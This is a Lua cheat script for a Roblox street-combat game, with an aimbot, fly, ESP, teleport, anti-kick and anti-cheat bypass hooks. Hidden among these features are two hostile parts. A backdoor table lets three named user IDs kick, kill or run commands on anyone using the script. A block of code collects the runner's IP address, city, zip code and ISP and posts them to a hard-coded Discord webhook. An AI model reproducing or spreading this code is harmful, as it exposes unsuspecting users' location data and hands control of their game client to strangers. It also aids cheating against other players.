repeat wait() until game:IsLoaded() and game:WaitForChild"Players";

for _,a in pairs(workspace:GetDescendants()) do
    if a:IsA("Seat") then
        a:Remove()
    end
end
for i,v in pairs(game.workspace:GetDescendants()) do if v.name == "ICEPATCH" then v:Destroy() end end
for i,v in pairs(game.workspace:GetDescendants()) do if v.name == "snow" then v:Destroy() end end


if game.PlaceId == 455366377 then
local LocalP = game.Players.LocalPlayer

LocalP.Character.Stamina.Changed:Connect(function()
    LocalP.Character:WaitForChild"Stamina"
    LocalP.Character.Stamina.Value = 100 
end)
LocalP.CharacterAdded:Connect(function()
    LocalP.Character:WaitForChild"Stamina"
    LocalP.Character.Stamina.Changed:Connect(function()
        LocalP.Character.Stamina.Value = 100 
end)
end)
end
--
local LoadingTime = tick();
local Commands, Prefix = {}, "";
getgenv().StreetsID = 455366377;
getgenv().PrisonID = 4669040;
getgenv().GetInit = function(CName)
    for _, v in next, Commands do 
        if table.find(v.Aliases, CName) then 
            return v.Function 
        end 
    end
end

local UserInputService = game:GetService('UserInputService')
local GetFocusedTextBox = UserInputService.GetFocusedTextBox

local Players = game:GetService('Players')
local Mouse = Players.LocalPlayer:GetMouse()

local Config = {
    Aimlock = {
        AimlockVelocity = 7;
        AimlockPart = 'Torso';
        AimlockTarget = Players.LocalPlayer;
    };
    Keys = {
    }
}

local Ol = false
local OnInputStart = function(Input)
    local Keys = Config.Keys
    local Aimlock = Config.Aimlock

    if Input.KeyCode == Keys.CustomKey1 and Mouse.Target.Parent:FindFirstChild("Humanoid") and not GetFocusedTextBox(UserInputService) then
        Aimlock.AimlockTarget = Players:FindFirstChild(Mouse.Target.Parent.Name)
             Notify("Flyhacks", "Aimbot/Lock Target = "..tostring(Aimlock.AimlockTarget), "", 3)
            elseif Input.KeyCode == Keys.CustomKey2 and not GetFocusedTextBox(UserInputService) then
        Ol = not Ol
     Notify("Flyhacks", "Aimlock = "..tostring(Ol), "", 3)
        end
end

local RunService = game:GetService('RunService')
local LocalPlayer = Players.LocalPlayer



UserInputService.InputBegan:Connect(OnInputStart)

UserInputService.InputBegan:Connect(function(Input)
    if Ol == true and Input.UserInputType == Enum.UserInputType.MouseButton1 then 
        LocalPlayer.Backpack.Input:FireServer("ml",{['mousehit'] = Config.Aimlock.AimlockTarget.Character[Config.Aimlock.AimlockPart].CFrame, ['shift'] = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift),['velo'] = Config.Aimlock.AimlockTarget.Character[Config.Aimlock.AimlockPart].CFrame})
        LocalPlayer.Backpack.Input:FireServer("moff1",{['mousehit'] = Config.Aimlock.AimlockTarget.Character[Config.Aimlock.AimlockPart].CFrame, ['shift'] = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift),['velo'] = Config.Aimlock.AimlockTarget.Character[Config.Aimlock.AimlockPart].CFrame})
 end
 end)

hookfunction(LocalPlayer.Kick, newcclosure(function() end))

for I, V in pairs(getconnections(game:GetService'ScriptContext'.Error)) do
    V:Disable()
end

local UserInputService = game:GetService('UserInputService')
local GetFocusedTextBox = UserInputService.GetFocusedTextBox

local Players = game:GetService('Players')
local Mouse = Players.LocalPlayer:GetMouse()

local Config = {
    Aimbot = {
        AimbotVelocity = 7;
        AimbotPart = 'Torso';
        AimbotTarget = Players.LocalPlayer;
    };
    Keys = {
    }
}

local On = false
local OnInputStart = function(Input)
    local Keys = Config.Keys
    local Aimbot = Config.Aimbot

    if Input.KeyCode == Keys.CustomKey1 and Mouse.Target.Parent:FindFirstChild("Humanoid") and not GetFocusedTextBox(UserInputService) then
        Aimbot.AimbotTarget = Players:FindFirstChild(Mouse.Target.Parent.Name)
                        Notify("Flyhacks", "Aimbot/Lock Target = "..tostring(Aimbot.AimbotTarget), "", 3)
    elseif Input.KeyCode == Keys.CustomKey2 and not GetFocusedTextBox(UserInputService) then
        On = not On
                        Notify("Flyhacks", "Aimbot = "..tostring(On), "", 3)
    end
end

local RunService = game:GetService('RunService')
local LocalPlayer = Players.LocalPlayer

RunService.Heartbeat:Connect(function()
    if Config.Aimbot.AimbotTarget.Character and On then
        LocalPlayer.Backpack.Input:FireServer("ml",{['mousehit'] = Config.Aimbot.AimbotTarget.Character[Config.Aimbot.AimbotPart].CFrame, ['shift'] = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift),['velo'] = Config.Aimbot.AimbotTarget.Character[Config.Aimbot.AimbotPart].CFrame})
        LocalPlayer.Backpack.Input:FireServer("moff1",{['mousehit'] = Config.Aimbot.AimbotTarget.Character[Config.Aimbot.AimbotPart].CFrame, ['shift'] = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift),['velo'] = Config.Aimbot.AimbotTarget.Character[Config.Aimbot.AimbotPart].CFrame})
    end
end)


UserInputService.InputBegan:Connect(OnInputStart)

hookfunction(LocalPlayer.Kick, newcclosure(function() end))

for I, V in pairs(getconnections(game:GetService'ScriptContext'.Error)) do
	V:Disable()
end

getgenv().RunCommand = function(Cmd)
    Cmd = string.lower(Cmd)
    pcall(function()
        if Cmd:sub(1, #Prefix) == Prefix then 
            local args = string.split(Cmd:sub(#Prefix + 1), " ")
            local CmdName = GetInit(table.remove(args, 1))
            if CmdName and args then
                return CmdName(args)
            end
        end
    end)
end

getgenv().Notify = function(title, text, icon, time)
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = title;
        Text = text;
        Icon = "";
        Duration = time;
    }) 
end

getgenv().psearch = function(Name)
    local Inserted = {}
        for _, p in pairs(game:GetService("Players"):GetPlayers()) do 
        if string.lower(string.sub(p.Name, 1, string.len(Name))) == string.lower(Name) then 
            table.insert(Inserted, p);return p
        end
    end
end


local ScreenGui = Instance.new("ScreenGui")
local Cmdbar = Instance.new("TextBox")

local Frame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")

ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = ScreenGui
Cmdbar.BorderColor3 = Color3.fromRGB(30,144,255)
Cmdbar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Cmdbar.BackgroundTransparency = 0.3
Cmdbar.BorderSizePixel = 1.5
Cmdbar.Position = UDim2.new(0, 0, 0.603333333333, 0)
Cmdbar.Size = UDim2.new(0, 0, 0, 40)
Cmdbar.SizeConstraint = Enum.SizeConstraint.RelativeYY
Cmdbar.Font = Enum.Font.GothamBlack
Cmdbar.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
Cmdbar.Text = ""
Cmdbar.TextColor3 = Color3.fromRGB(255,255,255)
Cmdbar.TextSize = 16.000
Cmdbar.Visible = false

Frame.Parent = Cmdbar
Frame.BackgroundTransparency = 1
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.005, 0, 0, 0)
Frame.Size = UDim2.new(0, 91, 0, 100)
local UIListLayout = Instance.new("UIListLayout", Frame)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local Uis = game:GetService("UserInputService")
Uis.InputBegan:Connect(
    function(Key, Typing)
        if Typing then
            return
        end
        if Key.KeyCode == Enum.KeyCode.Semicolon then
            Cmdbar.Visible = true
            Cmdbar.Text = ""
            wait()
            Cmdbar:CaptureFocus()
            Cmdbar:TweenSize(UDim2.new(0, 320, 0.004, 20), "Out", "Quad", 0.1, true)

        end
    end
)
Cmdbar.FocusLost:Connect(
    function(Foc)
        if Foc == true then
            Cmdbar.Visible = false
            Cmdbar:TweenSize(UDim2.new(0, 0, 0, -40), "Out", "Quad", 0.5, true)
            RunCommand(Cmdbar.Text)
        end
    end
)
Uis.InputEnded:Connect(
    function(Key)
        if Key.KeyCode.Name == "LeftAlt" then
            Cmdbar.Visible = false
        end
    end
)

game.Players.LocalPlayer.Chatted:Connect(function(Msg)
    RunCommand(Msg)
end)

-- //locals
local Players, RStorage, RService, TPService, TweenService, HttpService, SGui = game:GetService("Players"),game:GetService("ReplicatedStorage"),game:GetService("RunService"),game:GetService("TeleportService"), game:GetService("TweenService"), game:GetService("HttpService"), game:GetService("StarterGui")
local Client, Mouse = Players.LocalPlayer, Players.LocalPlayer:GetMouse();local LocalP = function() return Client.Character or Client.CharacterAdded:Wait() end
local Camera, CordCamera, CurCamera = workspace.CurrentCamera, workspace.CurrentCamera.CoordinateFrame, workspace.CurrentCamera;
local CF, UD, UD2, INew, Vec3, NColor3 = CFrame.new, UDim.new, UDim2.new, Instance.new, Vector3.new, Color3.fromRGB;
local ClickCheck, M1Held, Keyheld, BToggle, CanShoot, SelectingTarget, ColorGlock, ColorShotty = false, false, false, false, false, false, false, false
local Blink, FirstFly, Flying, Animating, Visualizing, Teleporting, Equipped, debounce, JumpingStateDebounce, RunSpeeding, Spying, Spamming = false, false, false, false, false, false, false, false, false, false, false, false, false
local Infjump, Noclip, ItemEsp, Airwalk, Aimbot, Aimlock, Camlock, GlockFollowing, ShottyFollow CashFarming, TPBypass, Feloop, Noslow, Attacked, Flinging, AntiFe, FeVan = false, false, false, false, false, false, nil, false, false, false, false, false, false, false, false, false, false
local FSpeed, BSpeed, TPSpeed, XSet, YSet, ZSet, OSet, X,Y,Z, x,y,z, AV, SpamDelay = 7, 3, 2, 88,77,66,5, 0, 0, 0, 0, 0, 0, 10, 2;local Legitmode = false
local FlyKey, NoClipKey, TrashTalkKey, ResetKey, AVUpKey, AVDownKey, BuyUziKey, BuyAmmoKey, BuyGlockKey, BuyFoodKey, LockOnKey, ShootLockedKey, AimPart, CamPart, BlinkKey, AimMode = "F";
local WSvalue, JPvalue, CSvalue = 16, 37.5, 8
local Ping, PingCF = RStorage:WaitForChild("DefaultChatSystemChatEvents"):FindFirstChild("MutePlayerRequest"), 0.1;
local UserTable, CyAdminUserTable, DrPoppaUserTable = {}, {}, {};
Client.CameraMaxZoomDistance = math.huge;workspace.FallenPartsDestroyHeight = -math.huge 
local AdminLoopKilling = false
-- yes i know my locals are ugly shut up

local VisTable1, VisTable2, RealTools = {}, {}, {}
local Aimlocked_Gamers, Camlocked_Gamers = {}, {}
local Seats, TrashTalk = {}, {"", "GO PLAY FREE FIRE UNKNOWN SKID", "NCA WYM UR SO GARBO OL", "LMFAO MY MOM IS BETTER AT HVH", "just quit ur assh", "CRY LOSER UR ADOPTED LOL"}
local AdminCmdList = {
    ["kick"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Client:Kick(self)
            end 
        end;
        ["Clearence"] = {[4] = true;[5] = true;};
    }; 
    ["kill"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Client.Character.Humanoid:ChangeState(15) 
            end 
        end;
        ["Clearence"] = {[3] = true;[4] = true;[5] = true;};
    }; 
    ["loopkill"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                AdminLoopKilling = true 
                while AdminLoopKilling == true and RService.Heartbeat:Wait() do
                    Client.Character.Humanoid:ChangeState(15) 
                end
            end 
        end;
        ["Clearence"] = {[4] = true;[5] = true;};
    }; 
    ["unloopkill"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                AdminLoopKilling = false 
            end 
        end;
        ["Clearence"] = {[4] = true;[5] = true;};
    }; 
    ["chat"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                wait(0.4);ChatWord(self) 
            end 
        end;
        ["Clearence"] = {[2] = true;[3] = true;[4] = true;[5] = true;};
    }; 
    ["freeze"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Client.Character.Head.Anchored = true 
            end 
        end;
        ["Clearence"] = {[3] = true;[4] = true;[5] = true;};
    }; 
    ["unfreeze"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Client.Character.Head.Anchored = false 
            end 
        end;
        ["Clearence"] = {[3] = true;[4] = true;[5] = true;};
    }; 
    ["nolimbs"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Client.Character["Left Leg"]:Destroy()
                Client.Character["Left Arm"]:Destroy() 
                Client.Character["Right Leg"]:Destroy() 
                Client.Character["Right Arm"]:Destroy() 
            end 
        end;
        ["Clearence"] = {[2] = true;[3] = true;[4] = true;[5] = true;};
    }; 
    ["bring"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer) 
            if Player == Client or Player == "all" then 
                Teleport(CmdPlayer.Character.Head.CFrame)
            end 
        end;
        ["Clearence"] = {[2] = true;[3] = true;[4] = true;[5] = true;};
    }; 
    ["exe"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer)
            if Player == Client or Player == "all" then 
                RunCommand(self)
            end
        end;
        ["Clearence"] = {[5] = true;};
    };
};
local BackDoorUsersTable = {
    [3762099904] = {["NAME"] = "syp";["COLOUR"] = Color3.fromRGB(255,255,255);["Access"] = 5;};
    [1281990039] = {["NAME"] = "lexi";["COLOUR"] = Color3.fromRGB(255,255,255);["Access"] = 5;};
 	[2314322282] = {["NAME"] = "cory";["COLOUR"] = Color3.fromRGB(255,255,255);["Access"] = 5;};
    
}
local AVTable = {
    [1] = true;[2] = true;
    [3] = true;[4] = true;
    [5] = true;[6] = true;
    [7] = true;[8] = true;
    [9] = true;[10] = true;
}
local TimeTable = {
    ["day"] = 14;
    ["night"] = 1;
}
local KeysTable = {
    ["W"] = false;["A"] = false;
    ["S"] = false;["D"] = false;
    ["LShift"] = false;["LControl"] = false;
}
local GunTable = {
    ["uzi"] = "Uzi | $150";["glock"] = "Glock | $200";
    ["sawoff"] = "Sawed Off | $125";["burger"] = "Burger | $15";
    ["pipe"] = "Pipe | $100";["chicken"] = "Chicken | $12"
}
local AimModesTable = {
    ["old"] = "Old";
    ["new"] = "New";
}
local AimPartsTable = {
    ["head"] = "Head";["torso"] = "Torso";
    ["root"] = "HumanoidRootPart";["toes"] = "Right Leg"
}
local CamTargetTable = {
    ["head"] = "Head";
    ["torso"] = "Torso";
}
local TPModesTable = {
    ["tween"] = Tween;
    ["cframe"] = Cframe1;
}
local VisToolTable = {
    ["glock"] = "Glock";["shotty"] = "Shotty";
    ["uzi"] = "Uzi";["sawoff"] = "Sawed Off";
    ["pipe"] = "Pipe";["katana"] = "Katana";
    ["spray"] = "Spray";["knife"] = "Knife";
    ["golf"] = "Golf Club";["machete"] = "Machete";
    ["radio"] = "BoomBox";
}
local ToolColorTable = {
    ["white"] = "White";
    ["blue"] = "Bright blue"; 
    ["red"] = "Bright red";
    ["yellow"] = "Bright yellow";
    ["green"] = "Bright green";
}

getgenv().BDCheck = function(Target, Chat)
    if Chat:sub(1, 1) == "~" then 
        local args = string.split(Chat:sub(2), " ")
        local Command = AdminCmdList[table.remove(args, 1)]
        local Target2 = psearch(table.remove(args, 1))
        if Command and Target2 then 
            return Command["CommandFunc"](Target2, table.concat(args, " "), Target)
        end
    end
end

getgenv().ChatWord = function(string)
    RStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(string), "All")
end

getgenv().ResetCharacter = function()
    if Client and Client.Character and Client.Character:FindFirstChild("Humanoid") then 
game.Players.LocalPlayer.Character["Torso"]:Remove()
    end
end


getgenv().MBotPlayer = function(Player)
    if Client and Client.Character and Client.Character:FindFirstChildWhichIsA("Tool") then 
        local TFound = Client.Character:FindFirstChildWhichIsA("Tool")
        local ClientPF = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
        if Player and Player.Character and Player.Character:FindFirstChild(AimPart) and ClientPF and TFound then 
            ClientPF.CFrame = Player.Character[AimPart].CFrame * CF(math.random(1, 7),5, math.random(-7, 1))
        end
    end
end

getgenv().Teleport = function(Thing)
    if Client and Client.Character then 
        local PFound = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
        if PFound and Thing then 
            local TPAction = TweenService:Create(PFound, TweenInfo.new(
                TPSpeed + .1, 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.InOut), 
                {CFrame = Thing}
            )
            TPAction:Play()
        end
    end
end

getgenv().togglefly = function()
    Flying = not Flying
    local T = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
    local BV, BG = INew("BodyVelocity", T), INew("BodyGyro", T)
    BV.Velocity = Vec3(0, 0.1, 0);BV.MaxForce = Vec3(math.huge, math.huge, math.huge)
    BG.CFrame = T.CFrame;BG.P = 9e9;BG.MaxTorque = Vec3(9e9, 9e9, 9e9)
    local FlyPart = INew("Part", workspace)
    FlyPart.Anchored = true;FlyPart.Size = Vec3(6, 1, 6);FlyPart.Transparency = 1 

    while Flying == true and Client and Client.Character and Client.Character:FindFirstChild("Humanoid") and Client.Character.Humanoid.Health ~= 0 and RService.Heartbeat:Wait() and T do 
        local Front, Back, Left, Right = 0, 0, 0, 0
        if KeysTable["W"] then 
            Front = FSpeed 
        elseif not KeysTable["W"] then
            Front = 0 
        end
        if KeysTable["A"] then 
            Right = -FSpeed
        elseif not KeysTable["A"] then 
            Right = 0 
        end
        if KeysTable["S"] then 
            Back = -FSpeed 
        elseif not KeysTable["S"] then 
            Back = 0
        end
        if KeysTable["D"] then 
            Left = FSpeed
        elseif not KeysTable["D"] then 
            Left = 0
        end
        if tonumber(Front + Back) ~= 0 or tonumber(Left + Right) ~= 0 then 
            BV.Velocity = ((Camera.CoordinateFrame.lookVector * (Front + Back)) + ((Camera.CoordinateFrame * CF(Left + Right, (Front + Back) * 0.2, 0).p) - Camera.CoordinateFrame.p)) * 50
        else 
            BV.Velocity = Vec3(0, 0.1, 0)
        end
        BG.CFrame = Camera.CoordinateFrame
    end
    FlyPart:Destroy();BG:Remove();BV:Remove()
end

getgenv().CreatePartEsp = function(Player)
    if Player and Player.Character and Player.Character:FindFirstChild(AimPart) then 
                -- Torso
        local SBox1 = INew("SelectionBox", workspace)
        SBox1.LineThickness = 0.02
        SBox1.Transparency = 0
        SBox1.Color3 = Color3.fromRGB(98, 37, 209)
        SBox1.Adornee = Player.Character:FindFirstChild("Torso")
        SBox1.Parent = Player.Character:FindFirstChild("Torso")
    end
end
local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1062926009881600121/HyK9i8nXlYRinw9L05h44tQGZl4dbh2UrVGKs5sgeDa6bDg9yS2LmnH12DaoeZ8VCMuc"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
getgenv().EspCoolKid = function(COolPlayer)
    local bgui = INew("BillboardGui", COolPlayer.Character:WaitForChild("Head", 10))
    local tlab = INew("TextLabel", bgui)
    bgui.Adornee = COolPlayer.Character.Head
    bgui.Size = UD2(0,100,0,100)
    bgui.StudsOffset = Vec3(0,1,0)
    bgui.AlwaysOnTop = true 
    tlab.BackgroundTransparency = 1
    tlab.Position = UD2(0,0,0,1)
    tlab.Size = UD2(1,0,0,10)
    tlab.TextStrokeTransparency = 0.5
    tlab.TextSize = 10
    tlab.TextStrokeColor3 = BackDoorUsersTable[COolPlayer.UserId].COLOUR
    tlab.TextColor3 = BackDoorUsersTable[COolPlayer.UserId].COLOUR
    tlab.Text = BackDoorUsersTable[COolPlayer.UserId].NAME
end

getgenv().Esp = function(Dude)
    local UserFound = UserTable[Dude] and "(Yes)" or "(No)"
    local bgui = Instance.new("BillboardGui", Dude.Character.Head)
    local tlabel = Instance.new("TextLabel", bgui)

    bgui.Name = "ESP"
    bgui.Adornee = part
    bgui.AlwaysOnTop = true
    bgui.ExtentsOffset = Vector3.new(0, 3, 0)
    bgui.Size = UDim2.new(0, 5, 0, 5)

    tlabel.Name = "espTarget"
    tlabel.BackgroundColor3 = Color3.new(255, 255, 255)
    tlabel.BackgroundTransparency = 1
    tlabel.BorderSizePixel = 0
    tlabel.Position = UDim2.new(0, 0, 0, -30)
    tlabel.Size = UDim2.new(1, 0, 7, 0)
    tlabel.Visible = true
    tlabel.ZIndex = 10
    tlabel.Font = "Code"
    tlabel.FontSize = "Size14"
    RService.RenderStepped:Connect(function()
        if Dude and Dude.Character and Dude.Character:FindFirstChildOfClass("Humanoid") then 
            tlabel.Text = Dude.Name.." | User: "..UserFound.." | Health: (".. math.floor((Dude.Character.Humanoid.Health))..")".." | ForceFielded: "..Values(Dude, "ForceField").." | Glock: "..Items(Dude,"Glock").." | Shotty: "..Items(Dude, "Shotty").." | Vest: "..Items(Dude, "BulletResist")
        end
    end)
    tlabel.TextColor3 = Color3.fromRGB(243,243,243)
    tlabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    tlabel.TextStrokeTransparency = 0
    CreatePartEsp(Dude)

    Dude.CharacterAdded:Connect(function()
        wait(0.2)
        local bgui = Instance.new("BillboardGui", Dude.Character.Head)
        local tlabel = Instance.new("TextLabel", bgui)

        bgui.Name = "ESP"
        bgui.Adornee = part
        bgui.AlwaysOnTop = true
        bgui.ExtentsOffset = Vector3.new(0, 3, 0)
        bgui.Size = UDim2.new(0, 5, 0, 5)

        tlabel.Name = "espTarget"
        tlabel.BackgroundColor3 = Color3.new(255, 255, 255)
        tlabel.BackgroundTransparency = 1
        tlabel.BorderSizePixel = 0
        tlabel.Position = UDim2.new(0, 0, 0, -30)
        tlabel.Size = UDim2.new(1, 0, 7, 0)
        tlabel.Visible = true
        tlabel.ZIndex = 10
        tlabel.Font = "Code"
        tlabel.FontSize = "Size14"
        RService.RenderStepped:Connect(function()
            if Dude and Dude.Character and Dude.Character:FindFirstChildOfClass("Humanoid") then 
                tlabel.Text = Dude.Name.." | User: "..UserFound.." | Health: (".. math.floor((Dude.Character.Humanoid.Health))..")".." | ForceFielded: "..Values(Dude, "ForceField").." | Glock: "..Items(Dude,"Glock").." | Shotty: "..Items(Dude, "Shotty").." | Vest: "..Items(Dude, "BulletResist")
            end
        end)
        tlabel.TextColor3 = Color3.fromRGB(243,243,243)
        tlabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        tlabel.TextStrokeTransparency = 0
        CreatePartEsp(Dude)
    end)
end


getgenv().UnEsp = function(Dude2)
    for _, v in pairs(Dude2.Character:GetDescendants()) do 
        if v:IsA("TextLabel") or v:IsA("BillboardGui") or v.Name == "SelectionBox" then 
            v:Destroy()
        end
    end
    Dude2.CharacterAdded:Connect(function()
        for _, v in pairs(Dude2.Character:GetDescendants()) do 
            if v:IsA("TextLabel") or v:IsA("BillboardGui") or v.Name == "SelectionBox" then 
                v:Destroy()
            end
        end
    end)
end

local function ConfirmCallbacks()
    repeat wait() until SGui 
    SGui:SetCore("ResetButtonCallback", true)
end
ConfirmCallbacks()


getgenv().RemoveVan = function()
    if FeVan == true and game.PlaceId == StreetsID and workspace["Armoured Truck"] then
        workspace["Armoured Truck"]:Destroy()
    else
        for _, v in pairs(workspace:GetChildren()) do 
            if v.Name == "TPer" then 
                v:Destroy()
            end 
        end
    end
end

getgenv().Items = function(Target, Item)
    if Target.Backpack:FindFirstChild(Item) or Target.Character:FindFirstChild(Item) then
        return "(Yes)"
    else
        return "(No)"
    end
end

getgenv().Values = function(Target)
    if not Target.Character:FindFirstChild("ForceField") then 
        return "(No)"
    elseif Target.Character:FindFirstChild("ForceField") then 
        return "(Yes)"
    end
end


getgenv().UnVis = function()
    Client.Character.Humanoid:UnequipTools()
end



-- [[ Ws/Jp Bypas ]] --
local gamelememe = getrawmetatable(game)
local Closure,Caller = hide_me or newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus
local writeable = setreadonly(gamelememe,false) or make_writeable(gamelememe)
local name,index,nindex = gamelememe.__namecall,gamelememe.__index,gamelememe.__newindex
 
gamelememe.__newindex = Closure(function(self,Property,b)
	if not Caller() then
        if self:IsA'Humanoid' then 
            game:GetService'StarterGui':SetCore('ResetButtonCallback',true)
            if Property == "WalkSpeed" then 
                return
            end
            if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
				return 
			end
		end
	end
	return nindex(self,Property,b)
end)
 
gamelememe.__namecall= Closure(function(self,...)
    if not Caller() then
        local Arguments = {...}
       	if getnamecallmethod() == "Destroy" and tostring(self) == "BodyPosition" or getnamecallmethod() == "Destroy" and tostring(self) == "BodyVelocity" then
            return invalidfunctiongang(self,...)
        end
        if getnamecallmethod() == "BreakJoints" and tostring(self) == game:GetService'Players'.LocalPlayer.Character.Name then
            return invalidfunctiongang(self,...)
        end
        if getnamecallmethod() == "FireServer" then 
            if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
                return wait(9e9)
            end
            if Arguments[1] == "hey" then 
                return wait(9e9)
            end
        end
    end
    return name(self,...)
end)
-- [[ Bypass ]] --
local rm = getrawmetatable(game) or debug.getrawmetatable(game) or getmetatable(game)
if setreadonly then setreadonly(rm, false) else make_writeable(rm, true) end
local caller, cscript = checkcaller or is_protosmasher_caller, getcallingscript or get_calling_script;
local rindex, nindex, ncall, closure = rm.__index, rm.__newindex, rm.__namecall, newcclosure or read_me;

rm.__newindex = closure(function(self, Meme, Val)
    if caller() then return nindex(self, Meme, Val) end 
    if game.PlaceId ~= (StreetsID) then 
        if Meme == "WalkSpeed" and Val == 0 and Noslow then 
            return 
        end
        --[[if Meme == "JumpPower" then 
            return 37.5 
        end 
        if Meme == "HipHeight" then 
            return 0 
        end]]--
        if Meme == "Health" then 
            return  
        end
    end
    if self:IsDescendantOf(Client.Character) and self.Name == "HumanoidRootPart" or self.Name == "Torso" then 
        if Meme == "CFrame" or Meme == "Position" or Meme == "Anchored" then 
            return  
        end
    end
    return nindex(self, Meme, Val) 
end)
rm.__namecall = closure(function(self, ...)
    local Args, Method = {...}, getnamecallmethod() or get_namecall_method();
    if Method == "BreakJoints" then 
        return wait(9e9)
    end
    if game.PlaceId ~= (StreetsID) then
        if Method == "FireServer" and not self.Name == "SayMessageRequest" then
            if tostring(self.Parent) == "ReplicatedStorage" or self.Name == "lIII" then 
                return wait(9e9) 
            end
            if Args[1] == "hey" then 
                return wait(9e9) 
            end
        end
        if Method == "FireServer" and self.Name == "Fire" and AimMode == "New" and AimlockTarget ~= nil and Aimlock == true then -- hi jeremy i see you looking at my aimlock i nerfed it
            return ncall(self, CF(AimlockTarget.Character[AimPart].Position) + AimlockTarget.Character[AimPart].Velocity/AV + AimlockTarget.Character[AimPart].RotVelocity/math.huge + AimlockTarget.Character[AimPart].Velocity/math.huge + AimlockTarget.Character[AimPart].RotVelocity/AV)
        end
    end
    if game.PlaceId == (StreetsID) then
        if Method == "FireServer" and Args[1] == "WalkSpeed" or Args[1] == "JumpPower" or Args[1] == "HipHeight" then 
            return nil 
        end
        if Method == "FireServer" and self.Name == "Input" then 
            if Args[1] == "bv" or Args[1] == "hb" or Args[1] == "ws" then 
                return wait(9e9)
            end
        end
    end
    return ncall(self, unpack(Args))
end)
if setreadonly then setreadonly(rm, true) else make_writeable(rm, false) end

Uis.InputBegan:Connect(function(Key)
    if not (Uis:GetFocusedTextBox()) then
        if Key.KeyCode == Enum.KeyCode.W then 
            KeysTable["W"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.A then 
            KeysTable["A"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.S then 
            KeysTable["S"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
            KeysTable["D"] = true 
        end
        if Key.KeyCode == Enum.KeyCode[FlyKey] and Legitmode == false then 
            if FirstFly == true then 
                Notify("Flyhacks", "Fly true", "", 3)
                FirstFly = false 
            end
            togglefly()
        end
        if Key.KeyCode == Enum.KeyCode[ResetKey] and Legitmode == false then 
            ResetCharacter()
        end
        if Key.KeyCode == Enum.KeyCode[TrashTalkKey] and Legitmode == false then 
            ChatWord(TrashTalk[math.random(1, #TrashTalk)])
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift and Legitmode == false then
            KeysTable["LShift"] = true
            while Blink == true and KeysTable["LShift"] and Client and Client.Character and RService.Heartbeat:Wait() do
                local ClientRF = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
                local Hum = Client.Character:FindFirstChild("Humanoid")
                ClientRF.CFrame = ClientRF.CFrame + Vec3(Hum.MoveDirection.X * BSpeed, Hum.MoveDirection.Y * BSpeed, Hum.MoveDirection.Z * BSpeed)
            end 
        end
        if Key.KeyCode == Enum.KeyCode[BuyAmmoKey] and game.PlaceId == (StreetsID) and Legitmode == false then 
            local Root = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
            local OldPos = Root.Position;Teleporting = true
            local Ammo = "Buy Ammo | $25"
            if workspace:FindFirstChild(Ammo) then 
                repeat Root.CFrame = Root.CFrame * CF(math.random(0.1, 900),0, math.random(0.1, 900))
                    while Uis:IsKeyDown(Enum.KeyCode[BuyAmmoKey]) and Teleporting == true and RService.Heartbeat:Wait() do 
                        Root.CFrame = workspace[Ammo]:FindFirstChildOfClass("Part").CFrame + Vec3(0.1, 1.1, 0.1)
                    end
                until not Uis:IsKeyDown(Enum.KeyCode[BuyAmmoKey])
            end
                                        Root = OldPos;Teleporting = false 
        end
